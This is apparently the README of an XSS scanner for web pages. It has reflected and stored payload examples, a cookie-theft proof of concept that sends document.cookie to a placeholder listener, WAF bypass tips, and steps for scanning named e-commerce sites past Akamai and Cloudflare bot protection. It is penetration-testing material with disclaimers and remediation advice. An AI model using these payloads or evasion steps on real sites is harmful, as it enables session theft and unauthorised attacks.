# 🔥 XSS Hunter Pro v3.0

> **Advanced Cross-Site Scripting (XSS) Vulnerability Scanner**  
> Reflected · Stored · Blind · Header Injection XSS Detection  
> Context-Aware Payloads | BFS Crawler | CSP Analysis | WAF Fingerprinting  
> Smart Form Auto-Fill | Encoding Retry Engine | Param Discovery | 810+ Payloads  
> JSON/CSV/HTML Export | Adaptive Rate Limiting | CI/CD Ready  
> Author: **Vishal** | For **authorized penetration testing only**

---

## ⚠️ Legal Disclaimer

> This tool is intended **exclusively for security professionals** testing systems they have **explicit written permission** to test.  
> Unauthorized use against systems you do not own or have permission to test is **illegal** and may result in criminal prosecution.  
> The author accepts **no liability** for misuse of this tool.

---

## 📋 Table of Contents

1. [What is XSS?](#-what-is-xss)
2. [What's New in v3.0](#-whats-new-in-v30)
3. [Features](#-features)
4. [Installation & Setup](#-installation--setup)
5. [Quick Start](#-quick-start)
6. [Understanding the Output — Step by Step](#-understanding-the-output--step-by-step)
7. [Real Test: testphp.vulnweb.com](#-real-test-testphpvulnwebcom)
8. [Scanning WAF-Protected Sites (Meesho, Flipkart, etc.)](#-scanning-waf-protected-sites)
9. [How to Manually Verify Findings](#-how-to-manually-verify-findings)
10. [Understanding the HTML Report](#-understanding-the-html-report)
11. [JSON/CSV Export for CI/CD](#-jsoncsv-export-for-cicd)
12. [How to Write a Bug Report](#-how-to-write-a-bug-report)
13. [All CLI Options Reference](#-all-cli-options-reference)
14. [Advanced Usage Examples](#-advanced-usage-examples)

---

## 💡 What is XSS?

**Cross-Site Scripting (XSS)** is a web vulnerability where an attacker injects malicious JavaScript into a web page viewed by other users. There are three types:

| Type | How it works | Severity |
|------|-------------|----------|
| **Reflected XSS** | Payload in URL/form → server echoes it back immediately | HIGH |
| **Stored XSS** | Payload saved in DB → executes every time ANY user loads the page | CRITICAL |
| **Blind XSS** | Payload stored, executes in an admin panel or backend you can't see | CRITICAL |

**Real-world impact:**
- 🍪 **Cookie/session theft** → account takeover
- 🔑 **Credential harvesting** → phishing via injected login forms
- 🖥️ **Defacement** → alter page content for all visitors
- 🔗 **Malware distribution** → redirect users to malicious sites
- 🕵️ **Keylogging** → capture everything a user types

---

## 🆕 What's New in v3.0

### New Scanning Engines
| Feature | Description |
|---------|-------------|
| **CSP Analyzer** | Detects Content-Security-Policy weaknesses: `unsafe-inline`, `unsafe-eval`, wildcard `*`, JSONP-able CDNs (googleapis, cloudflare, jsdelivr, unpkg), missing `script-src`/`object-src`/`base-uri` directives |
| **WAF Fingerprinter** | Identifies 30+ WAF/CDN signatures (Cloudflare, Akamai, AWS WAF, Imperva, ModSecurity, Sucuri, F5, Barracuda, Fortinet, Wordfence, DDoS-Guard, Fastly, Vercel, Netlify) with bypass tips for each |
| **Header Injection Scanner** | Tests XSS via HTTP request headers: User-Agent, Referer, X-Forwarded-For, X-Client-IP, X-Real-IP, X-Forwarded-Host, Origin, Via, True-Client-IP, CF-Connecting-IP (`--scan-headers`) |
| **Parameter Discovery** | Fuzzes 70+ common param names (q, search, callback, redirect, debug, template, etc.) against pages to find hidden reflecting parameters (`--discover-params`) |
| **Encoding Retry Engine** | When a payload is blocked, auto-retries with encoded variants: URL encode, double URL encode, Unicode escape, HTML entity (decimal/hex), mixed case, tab/newline insertion, null byte insertion |

### New Payloads
| Category | Count | Purpose |
|----------|-------|---------|
| **CSP Bypass Payloads** | 19 | JSONP CDN abuse, import maps, Trusted Types bypass, base-uri override, blob/worker injection |
| **Modern Framework Payloads** | 22 | React `dangerouslySetInnerHTML`, Vue 3 template injection, Alpine.js `x-data`/`x-html`/`x-init`, htmx `hx-on`/`hx-get`, Svelte `{@html}`, jQuery `globalEval`, Web Components, postMessage |

### New Output Formats
| Format | File | Use Case |
|--------|------|----------|
| **JSON** | `output/xss_results_*.json` | CI/CD pipelines, Jira integration, scripted analysis |
| **CSV** | `output/xss_results_*.csv` | Spreadsheet review, Excel import, bulk triage |
| **HTML** | `output/xss_report_*.html` | Human-readable dark-themed report (unchanged) |

### Infrastructure Improvements
| Improvement | Details |
|-------------|---------|
| **Adaptive Rate Limiting** | Auto-slows by +0.5s on each HTTP 429, respects `Retry-After` header, auto-speeds up by -0.05s on success — no manual `--delay` needed |
| **Phase 1B in scan flow** | CSP & WAF analysis runs automatically after crawl, before payload testing |
| **v2.0 → v3.0 version bump** | Banner, CLI, HTML report footer all updated |

### Results Improvement

| Metric | v2.0 | v3.0 | Change |
|--------|------|------|--------|
| Total payloads | 770+ | **810+** | +40 new payloads |
| Vulnerabilities on testphp.vulnweb.com | 16 | **18** | **+2 stored XSS** |
| Reflected XSS | 12 | 12 | Same (no regression) |
| Stored XSS | 4 | **6** | +2 (uphone, uaddress on signup) |

---

## ✨ Features

- 🕷️ **BFS Crawler** — auto-discovers all pages, forms, and URL parameters
- 🎯 **Reflected XSS** — canary-based reflection detection with context analysis + encoding retry fallback
- 💾 **Stored XSS** — smart form auto-fill with temp email/name/phone/address + submit → persist → verify workflow
- 👻 **Blind XSS** — tagged payloads with callback server support
- 🧠 **Context-Aware Payloads** — detects HTML, attribute (single/double/unquoted), script, comment, style contexts
- 💣 **810+ built-in payloads** across 20 categories (basic, encoding, WAF bypass, attribute escape, script escape, SVG, DOM, polyglot, CSS, template injection, protocol, mutation, filter bypass, null byte, stored-specific, blind, **CSP bypass, modern frameworks**)
- 🔐 **CSP Analyzer** — identifies unsafe-inline, unsafe-eval, wildcard, JSONP-able CDNs, missing directives
- 🛡️ **WAF Fingerprinter** — 30+ WAF signatures with per-WAF bypass tips
- 🔄 **Encoding Retry Engine** — auto-retries blocked payloads with URL/Unicode/HTML-entity/mixed-case/null-byte variants
- 🔍 **Parameter Discovery** — fuzzes 70+ common param names to find hidden injection points
- 💉 **Header Injection Scanner** — tests XSS via User-Agent, Referer, X-Forwarded-For, X-Client-IP, and more
- 📁 **Custom payload file** support
- 🌐 **HTTP Header injection** (User-Agent, Referer, X-Forwarded-For, etc.)
- 🎭 **Authentication** — cookies, Basic Auth, Bearer tokens, custom headers
- 🔌 **Proxy support** — route through Burp Suite / OWASP ZAP
- 📱 **SPA Detection** — identifies React, Next.js, Nuxt.js, Angular, Vue.js apps and extracts embedded routes
- 🔄 **Auto UA Rotation** — rotates User-Agent on 403/429 to bypass simple bot detection
- ⚡ **Adaptive Rate Limiting** — auto-slows on 429, respects Retry-After, speeds up on success
- 🤖 **Smart Form Filler** — auto-fills name, email, phone, address, message, username, password fields with realistic fake data
- 📊 **Dark-themed HTML report** with full details per vulnerability
- 📦 **JSON & CSV export** — structured output for CI/CD pipelines and spreadsheet review
- 📧 **Email alerts** for blind XSS triggers
- 🔓 **Single Python file** — no complex folder structure

---

## 🔧 Installation & Setup

### Prerequisites

- Python 3.8+
- pip3

### Step 1 — Clone or download

```bash
git clone https://github.com/Vishal-HaCkEr1910/Python_Cybersec_Projects.git
cd Python_Cybersec_Projects
```

### Step 2 — Create a virtual environment (recommended)

```bash
python3 -m venv vishal
source vishal/bin/activate
```

### Step 3 — Install dependencies

```bash
pip3 install -r requirements_xss.txt
```

Or manually:
```bash
pip3 install requests beautifulsoup4 lxml colorama
```

### Step 4 — Verify

```bash
python3 xss_scanner.py --help
```

---

## 🚀 Quick Start

```bash
# Activate virtual environment
source vishal/bin/activate

# Quick single-page scan
python3 xss_scanner.py -u "http://testphp.vulnweb.com/search.php?test=query"

# Full domain crawl (recommended)
python3 xss_scanner.py -u http://testphp.vulnweb.com/ --crawl --depth 2

# Full scan with header injection + param discovery
python3 xss_scanner.py -u http://testphp.vulnweb.com/ --crawl --depth 2 --scan-headers --discover-params

# Full scan with stored + blind XSS
python3 xss_scanner.py -u http://testphp.vulnweb.com/ --crawl --depth 2 --blind --callback-url http://YOUR_IP:8888/cb
```

---

## 🔍 Understanding the Output — Step by Step

### Phase 1 — Scan Configuration Table

```
╔══════════════════════════════════════════════════════════════════╗
║  SCAN CONFIGURATION                                              ║
╚══════════════════════════════════════════════════════════════════╝
┌────────────────────────┬────────────────────────────────────────┐
│ Setting                │ Value                                  │
├────────────────────────┼────────────────────────────────────────┤
│ Target                 │ http://testphp.vulnweb.com/            │
│ Mode                   │ Full Crawl (depth=2)                   │
│ Scan Types             │ Reflected, Stored                      │
│ Param Discovery        │ Disabled                               │
│ Encoding Retry         │ Enabled (auto-retry encoded variants)  │
│ Payload File           │ Built-in only                          │
│ Proxy                  │ None                                   │
│ Delay                  │ 0 (adaptive throttle)                  │
└────────────────────────┴────────────────────────────────────────┘
```

### Phase 2 — Crawling & Discovery

```
╔══════════════════════════════════════════════════════════════════╗
║  PHASE 1 — CRAWLING & DISCOVERY                                  ║
╚══════════════════════════════════════════════════════════════════╝
[→] [Depth 0] http://testphp.vulnweb.com/
[→] [Depth 1] http://testphp.vulnweb.com/guestbook.php
[→] [Depth 2] http://testphp.vulnweb.com/listproducts.php?cat=1
```

- `[→]` — page successfully fetched and parsed
- `[Depth N]` — how many link-hops away from the starting URL

### Phase 2B — CSP & WAF Analysis (NEW in v3.0)

```
╔══════════════════════════════════════════════════════════════════╗
║  PHASE 1B — SECURITY HEADER & WAF ANALYSIS                       ║
╚══════════════════════════════════════════════════════════════════╝
[✦] No WAF detected — payloads should reach the server unfiltered.
[CRITICAL] No CSP header
[LOW] No X-XSS-Protection
[LOW] No X-Content-Type-Options: nosniff
```

The scanner automatically:
1. **Fingerprints WAFs** — detects Cloudflare, Akamai, AWS WAF, Imperva, ModSecurity, Sucuri, F5, Barracuda, Fortinet, Wordfence, Fastly, Vercel, Netlify, DDoS-Guard, and more
2. **Provides bypass tips** — e.g., "Cloudflare: Use chunked encoding, try `<details/open/ontoggle=...>`"
3. **Analyzes CSP headers** — flags `unsafe-inline`, `unsafe-eval`, wildcard `*`, JSONP-able CDNs, missing directives
4. **Checks security headers** — X-XSS-Protection, X-Content-Type-Options

### Phase 3 — Crawled Pages Table

```
┌──────┬────────────────────────────────────┬──────┬────────┐
│  #   │ Page URL                           │Params│ Forms  │
├──────┼────────────────────────────────────┼──────┼────────┤
│ 7    │ .../guestbook.php                  │ 0    │ 5      │
└──────┴────────────────────────────────────┴──────┴────────┘
[✦] 24 pages  │  22 forms  │  59 injection points
```

### Phase 4 — Reflected XSS Testing

```
╔══════════════════════════════════════════════════════════════════╗
║  PHASE 2A — REFLECTED XSS TESTING                                ║
╚══════════════════════════════════════════════════════════════════╝
████████░░░░░░░░░░░  22.0% (13/59) name@/guestbook.php
[🔥 VULN] Reflected XSS → name @ .../guestbook.php [html_text]
```

- **Progress bar** shows injection points tested
- `[🔥 VULN]` — confirmed vulnerability!
- `[html_text]` — the injection context

### Phase 5 — Stored XSS Testing (NEW — Smart Form-Fill)

```
╔══════════════════════════════════════════════════════════════════╗
║  PHASE 2B — STORED XSS TESTING                                   ║
╚══════════════════════════════════════════════════════════════════╝
████████░░░░░░░░  35.0% (5/14) stored:text@/guestbook.php
[✦] Canary persists on .../guestbook.php — testing payloads...
[🔥 VULN] Stored XSS → text persists on .../guestbook.php [html_text]
```

**How the smart stored XSS scanner works:**
1. **Smart form-fill**: Fills ALL required fields with realistic fake data (temp email, fake name, phone number, address, message text) so the server accepts the submission
2. **Canary injection**: Submits a unique tracking string in the target field
3. **Persistence check**: Revisits the page + other pages to see if the canary was stored
4. **Context analysis**: Determines where the stored data lands in the HTML
5. **Payload fire**: Sends a context-aware XSS payload
6. **Verification**: Confirms the payload persists and is rendered unescaped

### Phase 6 — Final Results

```
╔══════════════════════════════════════════════════════════════════╗
║  SCAN COMPLETE — RESULTS                                         ║
╚══════════════════════════════════════════════════════════════════╝
│ Pages Crawled          │ 24                       │
│ Vulnerabilities Found  │ 32                       │
```

### Injection Context Types

| Context | Means | Example payload |
|---------|-------|----------------|
| `html_text` | Between HTML tags | `<script>alert(1)</script>` |
| `attr_double` | Inside `"double-quoted"` attribute | `" onmouseover="alert(1)` |
| `attr_single` | Inside `'single-quoted'` attribute | `' onmouseover='alert(1)` |
| `attr_unquoted` | Unquoted attribute value | ` onmouseover=alert(1) ` |
| `script_dquote` | Inside JS `"..."` string | `";alert(1);//` |
| `script_squote` | Inside JS `'...'` string | `';alert(1);//` |
| `comment` | Inside `<!-- HTML comment -->` | `--><script>alert(1)</script>` |
| `style` | Inside `<style>` block | `</style><script>alert(1)</script>` |

---

## 🧪 Real Test: testphp.vulnweb.com

> `http://testphp.vulnweb.com/` is **Acunetix's intentionally vulnerable demo** — safe and legal to test.

### Command:

```bash
python3 xss_scanner.py -u http://testphp.vulnweb.com/ --crawl --depth 2
```

### Results:

| Metric | Value |
|--------|-------|
| Pages Crawled | 25 |
| Forms Discovered | 23 |
| Injection Points | 62 |
| Reflected XSS Found | 12 |
| Stored XSS Found | 6 |
| **Total Vulnerabilities** | **18** |
| Scan Duration | ~89s |

### Key vulnerabilities:

| # | Type | Param | URL | Context |
|---|------|-------|-----|---------|
| 1 | Reflected | `searchFor` | Every page with search bar | html_text |
| 2 | Reflected | `cat` | `/listproducts.php?cat=1` | html_text |
| 3 | Reflected | `artist` | `/artists.php?artist=1` | html_text |
| 4 | Reflected | `pp` | `/hpp/?pp=12` | attr_double |
| 5 | Reflected | `uuname` | `/secured/newuser.php` | html_text |
| 6 | Reflected | `urname` | `/secured/newuser.php` | html_text |
| 7 | Reflected | `ucc` | `/secured/newuser.php` | html_text |
| 8 | Reflected | `uemail` | `/secured/newuser.php` | html_text |
| 9 | Reflected | `uphone` | `/secured/newuser.php` | html_text |
| 10 | Reflected | `uaddress` | `/secured/newuser.php` | html_text |
| 11 | **Stored** | `text` | `/guestbook.php` → persists | html_text |
| 12 | **Stored** | `name` | `/guestbook.php` → persists | html_text |
| 13 | **Stored** | `searchFor` | `/search.php` → POST response | html_text |
| 14 | **Stored** | `ucc` | `/secured/newuser.php` → POST response | html_text |
| 15 | **Stored** | `uphone` | `/secured/newuser.php` → POST response | html_text |
| 16 | **Stored** | `uaddress` | `/secured/newuser.php` → POST response | html_text |

### Why `attr_double` context on `/hpp/` is special:

The `pp` parameter lands inside a double-quoted HTML attribute:
```html
<input type="hidden" value="12">
```
So `<script>alert(1)</script>` won't work. The scanner automatically uses:
```
" onmouseover="alert(1)" x="
```
This breaks out of the attribute and injects an event handler.

### How the stored XSS on guestbook works:

1. Scanner fills ALL fields: `name` = "John Smith", `text` = `<script>alert(1)</script>`
2. Submits the form to `/guestbook.php`
3. Revisits the guestbook page
4. Finds `<script>alert(1)</script>` persisted in the HTML — **STORED XSS confirmed**

---

## 🛡️ Scanning WAF-Protected Sites

### The Problem

Many production websites like **Meesho**, **Flipkart**, **Amazon**, **Snapdeal**, and **Myntra** use Web Application Firewalls (WAFs) and bot-detection systems that block automated scanners.

When you try to scan these sites, you'll see:

```
[⚠] [WAF/Block] Akamai WAF (403) on https://meesho.com/
[⚠]   Target appears to be protected by a WAF or bot-detection system.
```

### WAF Types Our Tool Detects

| WAF/Protection | Detection Method |
|---------------|-----------------|
| **Cloudflare** | 403/503 + `__cf_bm` cookie + `cf-ray` header + "cloudflare" in body |
| **Akamai** | 403 + "Reference #" + "edgesuite" in body |
| **AWS WAF / CloudFront** | 403 + "Access Denied" + `x-amz-cf-id` header |
| **Imperva/Incapsula** | 403 + "incapsula" + visitor ID cookie + `x-iinfo` header |
| **ModSecurity** | 403 + "mod_security" / "OWASP CRS" in body |
| **Sucuri** | 403 + `x-sucuri-id` header + "sucuri" in body |
| **F5 BIG-IP** | `BIGipServer` / `TS` cookie patterns |
| **Barracuda** | `barra_counter_session` cookie + "barracuda" server header |
| **Fortinet FortiWeb** | `FORTIWAFSID` cookie + "fortigate"/"fortinet" in body |
| **Wordfence** | "wordfence" in body + `wfwaf-authcookie` |
| **DDoS-Guard** | `ddos-guard` server header |
| **Fastly** | `x-fastly-request-id` header |
| **Vercel Edge** | `x-vercel-id` header |
| **Netlify** | `x-nf-request-id` header |
| **Rate Limiting** | HTTP 429 (adaptive throttle auto-handles) |
| **CAPTCHA** | 200 but page contains "captcha"/"hcaptcha"/"recaptcha" |
| **JS Challenge** | 200 but empty body with only JavaScript |

### How to Bypass and Scan Protected Sites

> ⚠️ **Only test sites you have explicit permission to test (e.g., authorized bug bounty programs)**

---

#### Method 1 — Session Cookies from Your Browser (Most Effective)

1. Open the target site in Chrome/Firefox
2. Log in normally (complete any CAPTCHA challenges manually)
3. Open DevTools: `F12` → **Application** tab → **Cookies**
4. Copy ALL cookie name=value pairs
5. Pass them to the scanner:

```bash
python3 xss_scanner.py \
  -u "https://meesho.com/search?q=shirt" \
  --cookies "_________YOUR_COOKIES_HERE_________" \
  --delay 2

# Example with real cookie format:
python3 xss_scanner.py \
  -u "https://meesho.com/search?q=shirt" \
  --cookies "_shumans=abc123; meesho_sid=xyz789; csrftoken=tok456; _gat=1" \
  --delay 2
```

**Cookie template for common sites:**

<details>
<summary><b>🔴 Meesho</b> (Akamai WAF)</summary>

```bash
# 1. Go to meesho.com → Login → Open DevTools → Cookies
# 2. Copy these cookies:
python3 xss_scanner.py \
  -u "https://meesho.com/search?q=test" \
  --cookies "_shumans=______; meesho_sid=______; csrftoken=______" \
  --delay 2 \
  --depth 1
```
</details>

<details>
<summary><b>🔵 Flipkart</b> (Akamai WAF + Bot Detection)</summary>

```bash
# Flipkart uses heavy bot detection. Use real browser cookies:
python3 xss_scanner.py \
  -u "https://www.flipkart.com/search?q=test" \
  --cookies "T=______; SN=______; at=______; uid=______" \
  --delay 3 \
  --depth 1
```
</details>

<details>
<summary><b>🟢 Snapdeal</b></summary>

```bash
python3 xss_scanner.py \
  -u "https://www.snapdeal.com/search?keyword=test" \
  --cookies "______=______; ______=______" \
  --delay 2
```
</details>

<details>
<summary><b>🟡 Amazon India</b> (Advanced bot detection)</summary>

```bash
# Amazon has very aggressive bot detection.
# Best approach: scan through Burp Suite
python3 xss_scanner.py \
  -u "https://www.amazon.in/s?k=test" \
  --cookies "session-id=______; session-id-time=______; i18n-prefs=______" \
  --proxy http://127.0.0.1:8080 \
  --delay 5 \
  --depth 1
```
</details>

<details>
<summary><b>🟣 Any Cloudflare-Protected Site</b></summary>

```bash
# After passing the Cloudflare challenge in your browser:
python3 xss_scanner.py \
  -u "https://target.com/search?q=test" \
  --cookies "cf_clearance=______; __cf_bm=______" \
  --user-agent "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" \
  --delay 2
```
</details>

---

#### Method 2 — Scan Specific Endpoints (Skip Homepage)

Most WAFs block the homepage hardest. Scan specific endpoints directly:

```bash
# Instead of scanning the homepage:
# ❌ python3 xss_scanner.py -u https://meesho.com/ --crawl

# Scan specific search/product pages:
# ✅
python3 xss_scanner.py -u "https://meesho.com/search?q=test" --cookies "..." --delay 2
python3 xss_scanner.py -u "https://meesho.com/product/12345" --cookies "..." --delay 2
python3 xss_scanner.py -u "https://meesho.com/api/v1/search?query=test" --cookies "..."
```

---

#### Method 3 — Route Through Burp Suite

```bash
# 1. Start Burp Suite → Proxy → 127.0.0.1:8080
# 2. Browse the target in Burp's embedded browser (passes WAF automatically)
# 3. Run scanner through same proxy:
python3 xss_scanner.py \
  -u "https://meesho.com/search?q=test" \
  --cookies "your_real_cookies" \
  --proxy http://127.0.0.1:8080 \
  --delay 2
```

---

#### Method 4 — Add Delay to Avoid Rate Limiting

```bash
# Slow scan (2 second delay between every request)
python3 xss_scanner.py \
  -u "https://target.com/search?q=test" \
  --cookies "..." \
  --delay 2 \
  --timeout 15
```

---

#### Method 5 — Custom User-Agent

```bash
# Some WAFs block specific UA strings. Use your browser's exact UA:
python3 xss_scanner.py \
  -u "https://target.com/" \
  --user-agent "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" \
  --cookies "..." \
  --crawl
```

---

#### Method 6 — Full Custom Headers (API Tokens, CSRF, etc.)

```bash
python3 xss_scanner.py \
  -u "https://api.target.com/v1/search?q=test" \
  --headers '{"X-CSRF-Token":"abc123","Authorization":"Bearer eyJhbGciOi...","X-Requested-With":"XMLHttpRequest"}' \
  --cookies "session=xyz"
```

---

### Common Scenarios and Solutions

| Scenario | Error You See | Solution |
|----------|--------------|----------|
| **Akamai blocks everything** | `[WAF/Block] Akamai WAF (403)` | Use real browser cookies + `--delay 2` |
| **Cloudflare challenge page** | `[WAF/Block] Cloudflare (403)` | Pass `cf_clearance` cookie from browser |
| **Rate limited** | `[WAF/Block] Rate Limited (429)` | Add `--delay 3` or `--delay 5` |
| **CAPTCHA on every request** | `[WAF/Block] CAPTCHA Challenge` | Solve in browser first, use those cookies |
| **SPA / React / Next.js** | `[SPA Detected] Next.js` | Scan API endpoints directly |
| **Empty crawl results** | `0 pages │ 0 forms │ 0 points` | Use specific URL with parameters |
| **SSL errors** | Connection errors | Scanner auto-retries with `verify=False` |

---

## 🛠️ How to Manually Verify Findings

### Method 1 — Browser

Paste the URL directly:
```
http://testphp.vulnweb.com/listproducts.php?cat=<script>alert(1)</script>
```

### Method 2 — curl (Reflected XSS)

```bash
curl -s "http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" | grep -i "alert"
```

### Method 3 — curl (Stored XSS)

```bash
# Step 1: Inject (all fields filled!)
curl -s -X POST \
  -d "name=John+Smith&text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" \
  "http://testphp.vulnweb.com/guestbook.php"

# Step 2: Verify persistence
curl -s "http://testphp.vulnweb.com/guestbook.php" | grep -i "alert"
```

### Method 4 — Cookie Theft PoC

```bash
# Start listener:
python3 -m http.server 8888

# Payload:
<script>new Image().src="http://YOUR_IP:8888/?c="+document.cookie</script>
```

---

## 📊 Understanding the HTML Report

Open with: `open output/xss_report_*.html`

### Sections:

1. **Summary Stats** — total vulns, pages, forms, payloads sent, duration
2. **Crawled Pages Table** — 🔴 = has vulns, 🟢 = clean
3. **Vulnerability Cards** — each card shows:
   - Type (Reflected/Stored/Blind) + Severity (HIGH/CRITICAL)
   - URL, Parameter, Method, Context
   - Payload used
   - Evidence (server response snippet)
   - Ready-to-use curl command for manual verification

---

## 📦 JSON/CSV Export for CI/CD

v3.0 automatically generates JSON and CSV exports alongside the HTML report.

### JSON Export (`output/xss_results_*.json`)

```json
{
  "scan_info": {
    "target": "http://testphp.vulnweb.com/",
    "timestamp": "2025-02-23T01:50:05",
    "version": "3.0",
    "pages_crawled": 25,
    "forms_discovered": 23,
    "injection_points": 62,
    "total_payloads_sent": 45
  },
  "vulnerabilities": [
    {
      "type": "reflected",
      "severity": "HIGH",
      "url": "http://testphp.vulnweb.com/search.php?test=query",
      "parameter": "searchFor",
      "method": "POST",
      "context": "html_text",
      "payload": "<script>alert(1)</script>",
      "evidence": "..."
    }
  ],
  "csp_findings": [...],
  "waf_findings": [...]
}
```

**CI/CD pipeline integration example:**

```bash
# Run scan, then check JSON for CRITICAL findings
python3 xss_scanner.py -u "$TARGET_URL" --crawl --depth 2

# Parse with jq
jq '.vulnerabilities | length' output/xss_results_*.json  # Total vulns
jq '[.vulnerabilities[] | select(.severity=="CRITICAL")] | length' output/xss_results_*.json  # Critical only

# Fail CI if any CRITICAL found
CRITICALS=$(jq '[.vulnerabilities[] | select(.severity=="CRITICAL")] | length' output/xss_results_*.json)
if [ "$CRITICALS" -gt 0 ]; then echo "❌ $CRITICALS CRITICAL XSS found!"; exit 1; fi
```

### CSV Export (`output/xss_results_*.csv`)

Opens directly in Excel/Google Sheets. Columns: `type, severity, url, parameter, method, context, payload, evidence`

---

## 📝 How to Write a Bug Report

### Template

```
VULNERABILITY REPORT
=====================

Title:          Stored XSS in `text` parameter on guestbook.php
Severity:       CRITICAL
CWE:            CWE-79: Improper Neutralization of Input During Web Page Generation
OWASP:          A03:2021 – Injection

Target:         http://testphp.vulnweb.com/guestbook.php
Parameter:      text (POST form textarea)
Method:         POST

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. DESCRIPTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

The `text` parameter in the guestbook form is stored in the database
and rendered without sanitization on the guestbook page. Any visitor
to the page will execute the attacker's JavaScript.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
2. STEPS TO REPRODUCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Navigate to http://testphp.vulnweb.com/guestbook.php
2. In the "Name" field, enter: John Smith
3. In the "Message" field, enter: <script>alert(document.domain)</script>
4. Click Submit
5. Observe the alert popup on page reload — it executes for EVERY visitor

OR via curl:
  Step 1: curl -s -X POST -d "name=John+Smith&text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" \
          "http://testphp.vulnweb.com/guestbook.php"
  Step 2: curl -s "http://testphp.vulnweb.com/guestbook.php" | grep -i "alert"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
3. IMPACT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CRITICAL — Every user who visits the guestbook page will execute
the attacker's script. This enables:
- Session cookie theft → account takeover
- Credential harvesting via injected login forms
- Keylogging all user input
- Redirection to malicious sites
- Self-propagating XSS worm

CVSS v3.1: 8.1 (High) — AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
4. REMEDIATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. HTML-encode all user input before rendering:
   PHP: echo htmlspecialchars($text, ENT_QUOTES, 'UTF-8');

2. Implement Content-Security-Policy:
   Content-Security-Policy: default-src 'self'; script-src 'self'

3. Use prepared statements for database storage

4. Input validation — reject HTML tags in guestbook messages

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
5. REFERENCES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

- OWASP XSS Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- PortSwigger XSS Labs: https://portswigger.net/web-security/cross-site-scripting
```

---

## 🔧 All CLI Options Reference

| Flag | Default | Description |
|------|---------|-------------|
| `-u URL` | *(required)* | Target URL |
| `--crawl` | off | Enable BFS crawling |
| `--depth N` | 3 | Max crawl depth |
| `--max-pages N` | 500 | Max pages to crawl |
| `--delay N` | 0 | Seconds between requests (adaptive throttle active by default) |
| `--timeout N` | 10 | HTTP timeout per request |
| `--payload-file FILE` | — | Custom payload list |
| `--reflected-only` | off | Only reflected XSS |
| `--stored-only` | off | Only stored XSS |
| `--blind-only` | off | Only blind XSS |
| `--blind` | off | Add blind XSS alongside others |
| `--callback-url URL` | — | Blind XSS callback |
| `--scan-headers` | off | **NEW** — Test XSS via HTTP request headers (UA, Referer, X-Forwarded-For, etc.) |
| `--discover-params` | off | **NEW** — Fuzz 70+ param names to find hidden reflecting parameters |
| `--inject-headers` | off | Inject into HTTP headers |
| `--email ADDR` | — | Blind XSS email alerts |
| `--smtp-host HOST` | — | SMTP server |
| `--smtp-port PORT` | 587 | SMTP port |
| `--smtp-user USER` | — | SMTP username |
| `--smtp-pass PASS` | — | SMTP password |
| `--cookies "k=v"` | — | Session cookies |
| `--headers '{"K":"V"}'` | — | Custom HTTP headers |
| `--auth-type TYPE` | — | `basic` or `bearer` |
| `--auth-cred CRED` | — | `user:pass` or token |
| `--user-agent UA` | auto | Custom User-Agent |
| `--rotate-ua` | off | Rotate UA per request |
| `--proxy URL` | — | HTTP proxy (Burp/ZAP) |

---

## 🚀 Advanced Usage Examples

### Scan behind login (with cookies)

```bash
python3 xss_scanner.py \
  -u "https://target.com/dashboard" \
  --crawl \
  --cookies "PHPSESSID=abc123; auth_token=xyz789"
```

### Scan through Burp Suite

```bash
python3 xss_scanner.py \
  -u "http://target.com/" \
  --crawl \
  --proxy http://127.0.0.1:8080
```

### Blind XSS with callback

```bash
# Start listener:
python3 -m http.server 8888

# Scan:
python3 xss_scanner.py \
  -u "http://target.com/" \
  --crawl --blind \
  --callback-url http://YOUR_IP:8888/xss \
  --inject-headers
```

### Stealth / slow scan

```bash
python3 xss_scanner.py \
  -u "http://target.com/" \
  --crawl --delay 2 --timeout 15 --depth 2
```

### Custom payloads

```bash
# Create payloads.txt:
echo '<script>alert("custom")</script>' > payloads.txt
echo '<img src=x onerror=alert(1)>' >> payloads.txt

python3 xss_scanner.py -u "http://target.com/" --crawl --payload-file payloads.txt
```

### Stored XSS only (fast)

```bash
python3 xss_scanner.py \
  -u "http://testphp.vulnweb.com/guestbook.php" \
  --stored-only
```

### Full v3.0 scan (all features enabled)

```bash
python3 xss_scanner.py \
  -u http://testphp.vulnweb.com/ \
  --crawl --depth 3 \
  --scan-headers \
  --discover-params
```

### Header injection scan

```bash
python3 xss_scanner.py \
  -u "http://target.com/" \
  --crawl --scan-headers
```

### Hidden parameter discovery

```bash
python3 xss_scanner.py \
  -u "http://target.com/" \
  --crawl --discover-params
```

### API with Bearer token

```bash
python3 xss_scanner.py \
  -u "https://api.target.com/search?q=test" \
  --auth-type bearer \
  --auth-cred "eyJhbGciOiJIUzI1NiIs..."
```

---

## 📁 Output Files

```
output/
├── xss_report_YYYYMMDD_HHMMSS.html   ← Full HTML report (dark theme)
├── xss_results_YYYYMMDD_HHMMSS.json  ← Structured JSON (CI/CD pipelines)
├── xss_results_YYYYMMDD_HHMMSS.csv   ← CSV spreadsheet (Excel/Sheets)
└── blind_injections.json              ← Blind XSS log (if --blind used)
